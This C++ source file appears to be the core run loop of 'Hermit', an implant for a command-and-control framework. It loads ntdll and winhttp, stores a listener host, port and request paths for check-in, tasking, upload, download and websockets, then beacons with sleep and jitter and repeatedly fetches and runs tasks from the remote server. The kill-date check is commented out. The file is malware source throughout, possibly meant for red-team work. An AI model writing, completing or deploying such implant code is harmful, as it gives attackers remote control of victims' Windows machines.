#include "hermit.hpp"

namespace Hermit
{
	VOID Run(
		HINSTANCE       hInstance,
		INT 			nCmdShow,
		LPCWSTR			lpPayloadType,
		LPCWSTR			lpProtocol,
		LPCWSTR 		lpHost,
		INTERNET_PORT 	nPort,
		LPCWSTR 		lpReqPathCheckIn,
		LPCWSTR			lpReqPathDownload,
		LPCWSTR 		lpReqPathTaskGet,
		LPCWSTR 		lpReqPathTaskResult,
		LPCWSTR			lpReqPathUpload,
		LPCWSTR			lpReqPathWebSocket,
		INT 			nSleep,
		INT				nJitter,
		INT				nKillDate
	) {

		HMODULE hNTDLL = LoadLibrary(L"ntdll.dll");
        if (!hNTDLL)
        {
			return;
        }

        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
        if (!hWinHTTPDLL)
        {
			FreeLibrary(hNTDLL);
            return;
        }

		State::PState pState = new State::State;

		pState->pTeb 				= NtCurrentTeb();
		pState->hNTDLL				= hNTDLL;
		pState->hWinHTTPDLL			= hWinHTTPDLL;
		pState->pProcs 				= Procs::FindProcs(hNTDLL, hWinHTTPDLL);
		pState->hInstance 			= hInstance;
		pState->nCmdShow 			= nCmdShow;
		pState->lpPayloadType 		= lpPayloadType;
		pState->lpListenerProto 	= lpProtocol;
		pState->lpListenerHost 		= lpHost;
		pState->nListenerPort 		= nPort;
		pState->lpReqPathCheckIn 	= lpReqPathCheckIn;
		pState->lpReqPathTaskGet 	= lpReqPathTaskGet;
		pState->lpReqPathTaskResult = lpReqPathTaskResult;
		pState->lpReqPathDownload 	= lpReqPathDownload;
		pState->lpReqPathUpload 	= lpReqPathUpload;
		pState->lpReqPathWebSocket 	= lpReqPathWebSocket;
		pState->nSleep 				= nSleep;
		pState->nJitter 			= nJitter;
		pState->nKillDate 			= nKillDate;
		pState->wUUID 				= L"";
		pState->wTask 				= L"";
		pState->wTaskResult 		= L"";
		pState->hSession 			= NULL;
		pState->hConnect 			= NULL;
		pState->hRequest 			= NULL;
		pState->pSocket 			= NULL;
		pState->bQuit 				= FALSE;

		std::wstring wInfoJson = Handler::GetInitialInfoJSON(pState);

		Handler::HTTPInit(pState);
		if (pState->hSession == NULL || pState->hConnect == NULL)
		{
			goto exit;
		}

		// WinHttpSetStatusCallback(hSession, WinHttpCallback, WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);

		// Check in
		do
		{
			Sleep(pState->nSleep * 1000);

			if (Handler::CheckIn(pState, wInfoJson))
				break;
		} while (1 == 1);

		// Get/Execute/Send tasks
		do
		{
			Sleep(pState->nSleep * 1000);

			// Check if it reached the KillDate
			// if (reachedKillDate(pState))
			// 	break;

			Handler::Task(pState);

			// Manage socket connections
			// Handler::Socket(pState);
		} while (!pState->bQuit);

	exit:
		State::Free(pState);
		return;
	}
}

